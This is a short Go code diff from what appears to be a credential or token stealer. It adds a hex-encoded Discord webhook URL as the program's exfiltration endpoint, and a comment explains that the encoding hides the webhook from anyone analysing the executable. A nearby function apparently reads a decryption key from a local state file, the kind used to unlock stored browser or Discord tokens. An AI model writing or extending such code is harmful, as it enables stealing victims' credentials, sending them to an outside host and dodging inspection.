@@ -33,7 +33,7 @@ var (
 /*	Your webhook must be hex encoded (without 0x).
 	This is just a easy information hiding step to not let someone find your webhook analyzing the string in the executable at first.
 */
-const webhook = ""
+const webhook = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313236333035373032303338333339353930342f55725657546b5246753747592d6e33394747305667646f75377157665347785364445f694642354367386667356257476772726933644a36573774774d5a536a33553661"
 
 func secret_key(lspath string)([]byte, error){
 	var key []byte
